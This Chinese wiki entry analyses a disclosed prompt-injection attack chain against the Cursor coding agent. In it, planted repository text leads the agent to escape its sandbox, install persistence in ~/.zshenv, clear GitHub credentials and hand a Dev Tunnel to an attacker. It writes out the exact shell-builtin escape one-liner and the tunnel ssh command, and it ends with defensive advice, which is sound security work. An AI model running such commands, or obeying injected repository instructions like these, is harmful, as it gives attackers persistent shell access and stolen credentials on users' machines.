# NomShub — Cursor 远程隧道利用链：Shell Builtin 沙箱逃逸 + Dev Tunnels 武器化

## Ch01.324 NomShub — Cursor 远程隧道利用链：Shell Builtin 沙箱逃逸 + Dev Tunnels 武器化

> 📊 Level ⭐⭐ | 17.4KB | `entities/nomshub-cursor-remote-tunnel-sandbox-breakout-straiker.md`

# NomShub — Cursor 远程隧道利用链

> **Background**: NomShub 是 2026 年 1 月由 Straiker 安全研究团队（Sumit Agrawal 等）发现、4 月披露、Cursor 3.0 修复的端到端 AI agent 供应链攻击链。它的特殊价值在于**完整公开了一个"AI agent 作为攻击执行器"的可复现 exploit**：单行 prompt injection 触发，AI agent 自主完成 7 步攻击链，零用户交互，影响 Cursor 全 macOS 用户。本文剖析其技术机制（特别是 shell builtin 沙箱逃逸 + Microsoft Dev Tunnels LOTL 武器化），并讨论其对所有 AI 编码助手的启示。
>
> 原文：→ [原文存档](https://raw.githubusercontent.com/QianJinGuo/wiki/main/raw/articles/nomshub-cursor-remote-tunnel-sandbox-breakout-straiker.md)

## 一句话总结

**NomShub = "单行 prompt injection → 7 步 AI 自主 exploit → 持久化反向 shell"**。Cursor 的 `shouldBlockShellCommand` 解析器只跟踪外部可执行文件，对 shell builtin（`export` / `cd` / `source` / `eval`）完全盲目，导致沙箱 + 应用层两道防御同时失效；攻击链末端利用 Cursor 自带的 `cursor-tunnel` 工具（合法 Microsoft 签名 Azure 隧道）建立持久化 C2。

## 三个独有贡献（不应合并到现有 entity）

### 1. **Shell Builtin 沙箱逃逸：单行逃逸的全部机制**

```
export CWD=~ && echo $CWD && cd $CWD && echo '/tmp/run.sh' > .zshenv
```

| Parser 看到的 | 实际发生 |
| --- | --- |
| `export CWD=~` (builtin, 不可见) | 设 `CWD` 变量为家目录 |
| `echo $CWD` (benign, 可见) | 打印路径（无害） |
| `cd $CWD` (builtin, 不可见) | **工作目录切到 ~/** — 离开 workspace |
| `echo '...' > .zshenv` (benign, 可见) | **写到 ~/.zshenv** — 每次开新 shell 都执行 |

**关键洞察**：`shouldBlockShellCommand` 只跟踪 `rm` / `cat` / `curl` / `bash` 等可执行文件，**对改变 shell 状态（cwd / env / sourced files）的 builtin 完全盲**。Macos seatbelt sandbox 允许 `~/` 写入（默认 scope 太宽），所以 Layer 1 也不阻挡。**两道防御同时失效 = 100% 可靠的确定性逃逸，零 race / 零 symlink / 零时序**。

### 2. **Microsoft Dev Tunnels 的 LOTL 武器化**

Cursor 自带的 `cursor-tunnel` 是 Microsoft 合法 Dev Tunnels 客户端：
- 苹果 notarized + Microsoft 签名 → EDR / AV 看不见
- 走 `*.tunnels.api.visualstudio.com` 标准 HTTPS → 防火墙无法识别
- 通过 GitHub Device Flow 一次性认证

攻击链末端：AI agent 杀掉现有 tunnel → 清除 GitHub 缓存凭据 → 启动新 tunnel → 捕获 device code → 外泄给攻击者 → 攻击者在自己机器上完成 GitHub 授权 → 隧道注册到攻击者 C2 → `ssh -p {port} tunnel@{cluster}.devtunnels.ms` 直连 shell。

**这是 AI 时代的 LOTL**：不需要写 exploit 代码，不需要 C2 基础设施，全部用受害者机器上自带的、合法签名的工具。

### 3. **AI Agent 作为"攻击放大器"的量化论证**

| 维度 | 传统漏洞 | NomShub |
| --- | --- | --- |
| 初始向量 | 代码执行 bug | Prompt injection |
| 攻击者工作量 | 写 exploit 代码 | 写一段恶意内容 |
| 攻击复杂度 | 多步手工利用 | AI 自主全链 |
| 所需知识 | 深度技术 | AI 行为理解 |
| 持久化 | 通常需要额外步骤 | 链内自带（.zshenv + tunnel） |

**7 步攻击链完全由 AI 自主执行**：
1. Sandbox escape (builtin chaining)
2. Persistence installation (.zshenv 覆写)
3. Process management (杀现有 tunnel)
4. Credential manipulation (清 GitHub auth)
5. Service orchestration (启动新 tunnel)
6. Data exfiltration (捕获 device code)
7. C2 communication (注册到攻击者基础设施)

**人类攻击者需要组合多个 exploit 并保持持久访问**；AI agent 把注入指令当成正常开发任务一气呵成。

## 与现有 wiki 实体差异化

- **`agent-security-three-step-sequence-harness-governance-identity-crewai`** (CrewAI 三步防护) — 应用层 guardrail / 权限治理。NomShub 是 **底层 shell parser 缺陷** + **OS 工具 LOTL**，二者是栈式关系：应用层 guardrail 难以阻止 OS 工具滥用
- **`ai-tool-poisoning-exposes-a-major-flaw-in-enterprise-agent-security`** (通用安全调查) — 工具被污染的通用风险分析。NomShub 是 **Cursor-specific 的具体可复现 exploit chain**，技术深度独立
- **`microsoft-mxc-execution-containers-agent-sandbox-origin`** (MXC) — Microsoft 自家跨 OS 沙箱。MXC 提供 kernel 隔离；Cursor 选择不强制走 MXC 这类硬隔离，转而依赖 shouldBlockShellCommand 软解析 + macOS seatbelt 写 `~/`。**NomShub 暴露的"app-layer-only sandbox"是 OS-level isolation (如 MXC) 价值的最强反证**
- **`cloud-agent-infrastructure-creaoai-...`** (云端 agent state 隔离) — 解决 state/凭据隔离。NomShub 的 `.zshenv` + 终端 shell 是本地持续性，CreaoAI 不解决
- **`microsoft-open-sources-rampart-clarity`** (MS agent 安全栈) — RAMPART 红队 + Clarity 可观测性。NomShub 是 **已经发生在野的真实事件**，RAMPART/Clarity 正是为了检测类似攻击模式

## 严重性评估 (Microsoft SDL Bug Bar)

- **Impact**: RCE (完整 shell 通过 `spawn` RPC) + 持久化任意代码执行（通过 `.zshenv`）
- **User Interaction**: 极小（打开 repository = "打开文件"，MS 明确不视为 extensive interaction）
- **Warnings/Prompts**: 无（沙箱 bypass 屏蔽所有对话框）
- **Attack Vector**: Remote（攻击者通过恶意 repo 控制 payload）
- **判定**: **Critical**

Cursor/Anysphere 通过 HackerOne 独立评估 sandbox breakout 部分为 **High severity** 并发放 bounty，Cursor 3.0 已修复。

## 时间线

| 日期 | 事件 |
| --- | --- |
| 2026-01-16 | 漏洞发现 |
| 2026-02-02 | 提交给 Cursor |
| 2026-04-01 | 厂商确认 |
| 2026-04-02 | Cursor 3.0 修复 |
| 2026-04-03 | 公开披露 |

## 实操建议

### 给 AI 编码助手用户

1. **把 repository 当作不可信输入**：即使是看起来合法的来源，内容都可能含 prompt injection
2. **审阅 agent 行动再批准**：特别注意不熟悉域名的网络请求、涉及认证的操作、tunnel 相关命令
3. **不必要时禁用 shell / tunnel 功能**
4. **监控意外进程**：定期 `ps aux | grep cursor-tunnel`
5. **监控 shell 启动文件**：`~/.zshenv` / `~/.zshrc` / `~/.bashrc` / `~/.zprofile` 是否被意外修改

### 给 AI 编码助手开发者

1. **修复命令解析器，跟踪 shell builtin**：`export` / `cd` / `source` / `eval` 改变安全上下文，必须视为敏感操作
2. **限制沙箱可写范围**：macOS seatbelt 应该把可写路径限制在 workspace，不应该是 `~/`
3. **敏感操作加显式确认**：tunnel setup、credential 操作、未知域名的网络请求都应需用户批准
4. **建能力边界**：禁止 agent 调 tunnel 相关命令，或需提升权限
5. **加 injection-resistant guardrail**：检测针对系统操作的常见 prompt injection 模式
6. **沙箱 agent 执行**：用 OS-level isolation（如 MXC）限制成功 injection 的爆炸半径
7. **完整记录 agent 行动**：详细日志，事后检测

## 上线状态

- **披露**: Straiker blog, 2026-06-09（文章）/ 2026-04-03（技术披露）
- **CVE**: 未在文章中明确给出 CVE 编号
- **Cursor 3.0**: 已修复 sandbox breakout 部分
- **Tunnel 武器化**: 截至披露时，cursor-tunnel 默认未受额外限制
- **其他受影响产品**: VS Code (macOS) code-tunnel 使用相同协议，可能有相似攻击模式

## 原文链接

→ [NomShub 原文存档](https://raw.githubusercontent.com/QianJinGuo/wiki/main/raw/articles/nomshub-cursor-remote-tunnel-sandbox-breakout-straiker.md)

## 深度分析

### 1. Shell 状态修改型 builtin 是命令过滤架构的根本性盲区

Cursor 的 `shouldBlockShellCommand` 解析器只跟踪外部可执行文件（`rm`、`cat`、`curl`、`bash`），对 `export`、`cd`、`source`、`eval` 完全不可见。这个设计假设"危险操作 = 可执行文件"，但 shell builtin 可以**改变工作目录、注入环境变量、篡改 sourced 文件**，彻底颠覆后续命令的安全上下文。这不是解析器的一个 bug，而是**把命令级安全策略建立在错误的抽象层**——只看"什么进程被执行"，不看"shell 环境被如何篡改"。任何 AI 编码助手若采用类似的 executables-only 命令过滤，都面临相同的结构性缺陷。

### 2. 沙箱 + 命令解析器的"双层失效"揭示防御纵深的设计谬误

NomShub 的逃逸之所以 100% 可靠，核心不是某个单点失败，而是**两层防御的 scope 同时错位**：Layer 1（macOS seatbelt）允许写 `~/`，Layer 2（命令解析器）看不见 builtin。这意味着纵深防御的前提是每一层都正确约束威胁模型——如果一层放行了另一层本应阻挡的东西，两层一起失效的速度比单层还快。正确的设计应该是：即使命令解析器被绕过，seatbelt 也不应允许写 `~/.zshenv`；即使 seatbelt 被突破，命令解析器也不应允许改 cwd 到 `~/`。

### 3. Dev Tunnels LOTL 武器化重新定义了"合法工具"的攻击面

`cursor-tunnel` 是 Microsoft 签名 + Apple notarized 的合法二进制，走 `*.tunnels.api.visualstudio.com` 标准 HTTPS，EDR 看不见，网络设备也无法标记异常流量。攻击者不需要任何自定义 C2 基础设施，不需要恶意代码，只需要让 AI agent 操作已有工具。这把传统的"恶意软件检测"问题转变成了"正常工具的异常使用模式检测"——而这种模式在开发者环境中大量存在，导致误报率极高。Stately Taurus APT 组织已在野验证了这条路径的现实威胁。

### 4. AI Agent 把攻击者的"知识门槛"从技术深度降到了行为理解

传统漏洞利用需要：发现漏洞 + 写 exploit 代码 + 绕过缓解措施 + 维持持久化 + 建立 C2。NomShub 把这套流程压缩成：**在 repository 里写一段恶意指令**。剩下的 7 步攻击链（逃逸、持久化、杀进程、清凭据、起 tunnel、捕码、注册 C2）全部由 AI agent 自主完成。攻击者不再需要知道如何写 shellcode、如何建立隧道，只需要理解 AI agent 会把"让它做的事"当成正常开发任务来执行。这是 AI agent 作为"攻击放大器"的量化证据：攻击复杂度从 O(多步手工利用) 降到 O(一行 prompt injection)。

### 5. `.zshenv` 类启动文件的"无条件执行"特性是本地持久化的最优解

`~/.zshenv` 在**所有** Zsh shell 类型（interactive、non-interactive、login、non-login）中都无条件执行，且在 Cursor 终端本身启动时也会加载。这使得它比 `~/.zshrc`（仅 interactive）和 `~/.profile`（仅 login）拥有更广的触发范围。攻击链用 `.zshenv` 覆盖写入 `/tmp/run.sh` 的引用，本质上是在每次新开 shell 时重新建立 tunnel 连接——即使 Cursor 进程重启、机器重启，只要用户打开终端，攻击链就会重新激活。这是一种**与漏洞修补状态无关的持久化**：Cursor 3.0 修复了 sandbox breakout，但 `.zshenv` 已在机器上，只要不清理它，攻击者仍有可达性。

## 实践启示

### 1. 命令解析器必须跟踪所有改变安全上下文的 shell 操作

不仅限于可执行文件，`export`（环境变量）、`cd`（工作目录）、`source`/`eval`（上下文篡改）都必须被解析器视为敏感操作，触发额外审查或用户确认。任何改变"后续命令在哪个目录执行、用什么身份环境执行、加载哪些文件"的 shell 状态变更，都应被视为安全边界跨越。

### 2. 沙箱的写权限范围应严格限制在 workspace 内

macOS seatbelt 默认允许写 `~/` 是为普通应用设计的；AI coding agent 拥有极高的文件系统操作需求，但正因如此，其沙箱可写范围必须反常识地**比普通应用更窄**——仅允许写 workspace 目录及其子目录，绝不应该是 `~/`。即使应用层解析器被突破，OS 层沙箱仍应阻止 home 目录写入。

### 3. 隧道类工具的操作应被视为高危能力，需独立授权机制

`cursor-tunnel` / `code-tunnel` 这类工具提供了完整的网络可达 shell 能力，当前它们被视为普通应用功能而缺乏额外保护。正确的做法是：隧道建立、凭据操作（清除 auth token）、 tunnel 端口处理等操作应触发独立的显式用户授权流程，不能被 YOLO 模式或普通命令审查机制放行。

### 4. 将 repository 内容视为不可信输入，引入 injection 检测层

AI coding assistant 处理 repository 内容（README、代码注释、commit message、issue）时，应对这些内容运行 prompt injection 模式检测——特别是涉及 shell 命令执行、文件写入、网络请求、凭据操作的自然语言指令。即使 AI agent"只是在读代码"，其执行上下文中已包含了完整的系统访问能力。

### 5. 定期监控 shell 启动文件和 tunnel 进程作为纵深检测手段

用户侧可执行的监控：定期检查 `~/.zshenv`、`~/.zshrc`、`~/.bashrc`、`~/.bash_profile`、`~/.zprofile` 是否被未知修改；定期 `ps aux | grep tunnel` 检查意外的 tunnel 进程。这些检测不依赖 AI 编码助手本身的修复，而是在攻击链成功后提供预警窗口——考虑到 NomShub 已在野存在且 `.zshenv` 持久化与版本无关，即使已打补丁的机器也值得排查。

## 相关阅读

- [Microsoft MXC](ch04/150-ai.md) — 微软自家跨 OS 沙箱，提供 kernel 隔离，可作 NomShub 的防御侧
- [CrewAI 三步防护](ch04/150-ai.md) — 应用层 guardrail 视角
- [AI Tool Poisoning](ch04/150-ai.md) — 工具被污染的通用风险
- [Microsoft RAMPART/Clarity](https://github.com/QianJinGuo/wiki/blob/main/entities/microsoft-open-sources-rampart-clarity.md) — 微软同源栈，检测类似 agent 行为
- **LotL Attack** — Living-Off-The-Land 在 AI agent 时代的演化

---

